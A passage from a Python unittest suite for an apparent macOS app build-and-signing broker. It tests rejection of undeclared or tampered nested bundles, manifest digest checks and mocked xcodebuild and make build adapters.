                    / "com.example.Demo.Helper.plist"
                )
                with plist_path.open("wb") as handle:
                    plistlib.dump(
                        {
                            "Label": "com.example.Demo.Helper",
                            "BundleProgram": "Contents/MacOS/DemoHelper",
                            key: value,
                        },
                        handle,
                    )
                with self.assertRaises(broker.BrokerError):
                    self.validate(self.app, self.profile)


class PluginBundleValidationTests(BundleFixtureMixin, unittest.TestCase):
    """Runtime validation of a universal app that embeds a HAL plug-in bundle.

    This exercises the same shape as the openconnct profile: a two-architecture
    application whose only nested code is a CoreAudio plug-in bundle, loaded by
    coreaudiod rather than launchd.
    """

    def setUp(self) -> None:
        self.lipo_output = "arm64 x86_64"
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.profile = self.plugin_profile()
        self.app = self.build_plugin_bundle(self.root)

    def plugin_profile(self) -> dict:
        return {
            "bundle_name": "Demo.app",
            "bundle_identifier": "com.example.Demo",
            "bundle_display_name": "Demo",
            "executable": "Demo",
            "package_type": "APPL",
            "architectures": ["arm64", "x86_64"],
            "minimum_system_version": "13.0",
            "team_id": "ABCDE12345",
            "max_files": 500,
            "max_uncompressed_bytes": 10_000_000,
            "nested_executables": [
                {
                    "path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver/Contents/MacOS/Demo",
                    "identifier": "com.example.Demo.driver",
                    "entitlements": "entitlements/teleprompter.plist",
                    "plugin_bundle": {
                        "path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver",
                        "identifier": "com.example.Demo.driver",
                        "package_type": "BNDL",
                    },
                }
            ],
        }

    def build_plugin_bundle(self, root: Path) -> Path:
        app = root / "Demo.app"
        macos = app / "Contents" / "MacOS"
        macos.mkdir(parents=True)
        (app / "Contents" / "Resources").mkdir(parents=True)
        driver = app / "Contents" / "Library" / "Audio" / "Plug-Ins" / "HAL" / "Demo.driver"
        driver_macos = driver / "Contents" / "MacOS"
        driver_macos.mkdir(parents=True)

        (macos / "Demo").write_bytes(self.ARM64_MACHO)
        (macos / "Demo").chmod(0o755)
        (driver_macos / "Demo").write_bytes(self.ARM64_MACHO)
        (driver_macos / "Demo").chmod(0o755)
        with (driver / "Contents" / "Info.plist").open("wb") as handle:
            plistlib.dump(
                {
                    "CFBundleIdentifier": "com.example.Demo.driver",
                    "CFBundleExecutable": "Demo",
                    "CFBundlePackageType": "BNDL",
                },
                handle,
            )
        with (app / "Contents" / "Info.plist").open("wb") as handle:
            plistlib.dump(
                {
                    "CFBundleIdentifier": "com.example.Demo",
                    "CFBundleExecutable": "Demo",
                    "CFBundlePackageType": "APPL",
                    "CFBundleShortVersionString": "1.2.3",
                    "CFBundleVersion": "1",
                    "CFBundleDisplayName": "Demo",
                    "LSMinimumSystemVersion": "13.0",
                },
                handle,
            )
        return app

    def test_universal_app_with_a_declared_plugin_is_accepted(self) -> None:
        result = self.validate(self.app, self.profile)
        self.assertEqual(result["architectures"], ["arm64", "x86_64"])
        record = result["nested_executables"][0]
        self.assertEqual(record["architectures"], ["arm64", "x86_64"])
        plugin = record["plugin_bundle"]
        self.assertEqual(plugin["identifier"], "com.example.Demo.driver")
        self.assertEqual(plugin["package_type"], "BNDL")
        info = self.app / plugin["path"] / "Contents" / "Info.plist"
        self.assertEqual(plugin["info_plist_sha256"], broker.sha256_file(info))

    def test_app_architecture_mismatch_is_rejected(self) -> None:
        # The runner may only build one slice; a universal profile must not accept
        # a thin binary, or an Intel Mac would silently get no audio driver.
        self.lipo_output = "arm64"
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_undeclared_driver_bundle_is_rejected(self) -> None:
        # A profile that ships no plug-in must not let a .driver slip through: the
        # allowance is keyed to the exact declared path.
        profile = self.plugin_profile()
        profile.pop("nested_executables")
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, profile)
        self.assertIn("Nested bundles are not allowed", str(caught.exception))

    def test_miscased_driver_bundle_is_rejected(self) -> None:
        # APFS is case-insensitive, so a miscased Demo.DRIVER names the same runtime
        # directory but is not the declared path; it must be rejected.
        stray = (
            self.app / "Contents" / "Library" / "Audio" / "Plug-Ins" / "HAL" / "Stray.DRIVER"
        )
        stray.mkdir(parents=True)
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, self.profile)
        self.assertIn("Nested bundles are not allowed", str(caught.exception))

    def test_plugin_identity_mismatch_is_rejected(self) -> None:
        for key, value in (
            ("CFBundleIdentifier", "com.attacker.driver"),
            ("CFBundlePackageType", "APPL"),
            ("CFBundleExecutable", "Other"),
        ):
            with self.subTest(key=key):
                app = self.build_plugin_bundle(Path(tempfile.mkdtemp(dir=self.root)))
                info_path = (
                    app
                    / "Contents"
                    / "Library"
                    / "Audio"
                    / "Plug-Ins"
                    / "HAL"
                    / "Demo.driver"
                    / "Contents"
                    / "Info.plist"
                )
                with info_path.open("rb") as handle:
                    info = plistlib.load(handle)
                info[key] = value
                with info_path.open("wb") as handle:
                    plistlib.dump(info, handle)
                with self.assertRaises(broker.BrokerError):
                    self.validate(app, self.profile)

    def test_missing_plugin_info_plist_is_rejected(self) -> None:
        (
            self.app
            / "Contents"
            / "Library"
            / "Audio"
            / "Plug-Ins"
            / "HAL"
            / "Demo.driver"
            / "Contents"
            / "Info.plist"
        ).unlink()
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)


class SignedPayloadComparisonTests(BundleFixtureMixin, unittest.TestCase):
    def setUp(self) -> None:
        self.lipo_output = "arm64"
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.profile = self.build_profile()
        self.signed = self.build_bundle(self.root / "signed")
        self.candidate = self.build_bundle(self.root / "candidate")

    def test_identical_payloads_compare_equal(self) -> None:
        broker.compare_signed_payload(self.signed, self.candidate, self.profile)

    def test_swapped_nested_executable_is_detected(self) -> None:
        helper = self.candidate / "Contents" / "MacOS" / "DemoHelper"
        helper.write_bytes(self.ARM64_MACHO + b"\x00tampered")
        with self.assertRaises(broker.BrokerError):
            broker.compare_signed_payload(self.signed, self.candidate, self.profile)

    def test_missing_nested_executable_is_detected(self) -> None:
        (self.candidate / "Contents" / "MacOS" / "DemoHelper").unlink()
        with self.assertRaises(broker.BrokerError):
            broker.compare_signed_payload(self.signed, self.candidate, self.profile)


class PreflightManifestTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.path = Path(self.temporary.name) / "preflight-manifest.json"
        self.pre_sign = {
            "tree_sha256": "a" * 64,
            "main_executable_sha256": "b" * 64,
            "nested_executables": [{"path": "Contents/MacOS/DemoHelper", "sha256": "c" * 64}],
        }
        self.manifest = {
            "profile": "demo",
            "version": "1.2.3",
            "profile_digest": "d" * 64,
            "application": {
                "tree_sha256": "a" * 64,
                "main_executable_sha256": "b" * 64,
                "nested_executables": [
                    {"path": "Contents/MacOS/DemoHelper", "sha256": "c" * 64}
                ],
            },
        }

    def verify(self) -> None:
        self.path.write_text(json.dumps(self.manifest), encoding="utf-8")
        broker.verify_preflight_manifest(self.path, "demo", "1.2.3", self.pre_sign, "d" * 64)

    def test_matching_manifest_is_accepted(self) -> None:
        self.verify()

    def test_moved_nested_digest_is_rejected(self) -> None:
        self.manifest["application"]["nested_executables"][0]["sha256"] = "e" * 64
        with self.assertRaises(broker.BrokerError):
            self.verify()

    def test_dropped_nested_record_is_rejected(self) -> None:
        self.manifest["application"]["nested_executables"] = []
        with self.assertRaises(broker.BrokerError):
            self.verify()

    def test_extra_nested_record_is_rejected(self) -> None:
        self.manifest["application"]["nested_executables"].append(
            {"path": "Contents/MacOS/Other", "sha256": "f" * 64}
        )
        with self.assertRaises(broker.BrokerError):
            self.verify()

    def test_mismatched_profile_digest_is_rejected(self) -> None:
        self.manifest["profile_digest"] = "0" * 64
        with self.assertRaises(broker.BrokerError):
            self.verify()

    def test_mismatched_version_is_rejected(self) -> None:
        self.manifest["version"] = "9.9.9"
        with self.assertRaises(broker.BrokerError):
            self.verify()

    def test_missing_manifest_is_rejected(self) -> None:
        with self.assertRaises(broker.BrokerError):
            broker.verify_preflight_manifest(self.path, "demo", "1.2.3", self.pre_sign, "d" * 64)


class BuildSettingsTests(unittest.TestCase):
    def test_team_id_is_passed_to_xcodebuild_only_when_declared(self) -> None:
        profile = {"architectures": ["arm64"]}
        self.assertNotIn(
            "DEVELOPMENT_TEAM=ABCDE12345", broker.xcodebuild_settings(profile, "1.2.3", "7")
        )
        profile["team_id"] = "ABCDE12345"
        settings = broker.xcodebuild_settings(profile, "1.2.3", "7")
        self.assertIn("DEVELOPMENT_TEAM=ABCDE12345", settings)
        self.assertIn("MARKETING_VERSION=1.2.3", settings)
        self.assertIn("CURRENT_PROJECT_VERSION=7", settings)
        self.assertIn("ARCHS=arm64", settings)

    def test_existing_xcode_profiles_keep_their_build_settings(self) -> None:
        settings = broker.xcodebuild_settings(broker.get_profile("ptionsplus"), "1.2.3", "7")
        self.assertEqual(
            settings,
            [
                "MARKETING_VERSION=1.2.3",
                "CURRENT_PROJECT_VERSION=7",
                "ENABLE_HARDENED_RUNTIME=YES",
                "CODE_SIGN_INJECT_BASE_ENTITLEMENTS=NO",
                "CODE_SIGNING_ALLOWED=NO",
                "CODE_SIGNING_REQUIRED=NO",
                "ARCHS=arm64",
                "ONLY_ACTIVE_ARCH=NO",
            ],
        )


# Tools the macos-15 runner image provides. The untrusted build job installs
# nothing, so an adapter that reaches for anything outside this set fails at
# dispatch time on a real runner rather than in review. `make` is GNU Make from
# the Command Line Tools that ship with Xcode on the runner image; the
# openconnct-make adapter uses it to drive a committed Makefile, and the
# compilers that Makefile invokes (clang, swiftc, libtool, lipo) come from the
# same toolchain.
PREINSTALLED_TOOLS = {
    "codesign",
    "ditto",
    "file",
    "git",
    "hdiutil",
    "lipo",
    "make",
    "plutil",
    "swift",
    "xattr",
    "xcodebuild",
    "xcrun",
}


class BuildAdapterTests(unittest.TestCase):
    def test_every_declared_adapter_has_a_dispatch_branch(self) -> None:
        # load_profiles() only checks the adapter against an allowlist. Without
        # this, onboarding a profile and forgetting its dispatch branch stays
        # invisible until the privileged pipeline is already running.
        source = inspect.getsource(broker.command_build)
        for name, profile in sorted(broker.load_profiles().items()):
            with self.subTest(profile=name):
                self.assertIn(f'adapter == "{profile["build_adapter"]}"', source)

    def test_adapters_require_only_tools_the_runner_provides(self) -> None:
        for name in dir(broker):
            if not name.startswith(("build_", "assemble_")):
                continue
            function = getattr(broker, name)
            if not callable(function) or name == "build_parser":
                continue
            source = inspect.getsource(function)
            for group in re.findall(r"require_tools\(\s*\[([^\]]*)\]", source):
                for tool in re.findall(r'"([^"]+)"', group):
                    with self.subTest(adapter=name, tool=tool):
                        self.assertIn(tool, PREINSTALLED_TOOLS)

    def test_spacemender_builds_the_committed_project(self) -> None:
        profile = broker.get_profile("spacemender")
        calls: list[list[str]] = []

        def fake_run(command, **kwargs):  # type: ignore[no-untyped-def]
            calls.append(command)
            return subprocess.CompletedProcess(command, 0, "", "")

        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source"
            (source / "SpaceMender.xcodeproj").mkdir(parents=True)
            (source / "SpaceMender.xcodeproj" / "project.pbxproj").write_text("", encoding="utf-8")
            work = Path(temporary) / "work"
            work.mkdir()
            with mock.patch.object(broker, "run", side_effect=fake_run):
                broker.build_spacemender(source, work, profile, "1.2.3", "42")

        self.assertEqual(len(calls), 1, "the build must be a single xcodebuild invocation")
        command = calls[0]
        self.assertEqual(command[0], "xcodebuild")
        self.assertIn("-project", command)
        self.assertIn(f"DEVELOPMENT_TEAM={profile['team_id']}", command)

    def test_spacemender_build_requires_the_committed_project(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source"
            source.mkdir(parents=True)
            work = Path(temporary) / "work"
            work.mkdir()
            with self.assertRaises(broker.BrokerError):
                broker.build_spacemender(
                    source, work, broker.get_profile("spacemender"), "1.2.3", "42"
                )

    def test_openconnct_builds_the_committed_makefile(self) -> None:
        profile = broker.get_profile("openconnct")
        calls: list[list[str]] = []

        def fake_run(command, **kwargs):  # type: ignore[no-untyped-def]
            calls.append(command)
            return subprocess.CompletedProcess(command, 0, "", "")

        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source"
            source.mkdir(parents=True)
            (source / "Makefile").write_text("build:\n\ttrue\n", encoding="utf-8")
            work = Path(temporary) / "work"
            work.mkdir()
            app = work / "dist" / profile["bundle_name"] / "Contents"
            app.mkdir(parents=True)
            with (app / "Info.plist").open("wb") as handle:
                plistlib.dump(
                    {"CFBundleShortVersionString": "0.0.0", "CFBundleVersion": "0"}, handle
                )
            with mock.patch.object(broker, "run", side_effect=fake_run):
                built = broker.build_openconnct(source, work, profile, "1.2.3", "42")

            self.assertEqual(built, work / "dist" / profile["bundle_name"])
            with (built / "Contents" / "Info.plist").open("rb") as handle:
                stamped = plistlib.load(handle)

        self.assertEqual(len(calls), 1, "the build must be a single make invocation")
        command = calls[0]
        self.assertEqual(command[0], "make")
        self.assertIn("embed-driver", command)
        self.assertIn("UNIVERSAL=1", command)
        self.assertTrue(any(part.startswith("DIST_DIR=") for part in command))
        self.assertEqual(stamped["CFBundleShortVersionString"], "1.2.3")
        self.assertEqual(stamped["CFBundleVersion"], "42")

    def test_openconnct_build_requires_the_committed_makefile(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source"
            source.mkdir(parents=True)
            work = Path(temporary) / "work"
            work.mkdir()
            with mock.patch.object(broker, "run", side_effect=AssertionError("must not build")):
                with self.assertRaises(broker.BrokerError):
                    broker.build_openconnct(
                        source, work, broker.get_profile("openconnct"), "1.2.3", "42"
                    )


if __name__ == "__main__":
    unittest.main()
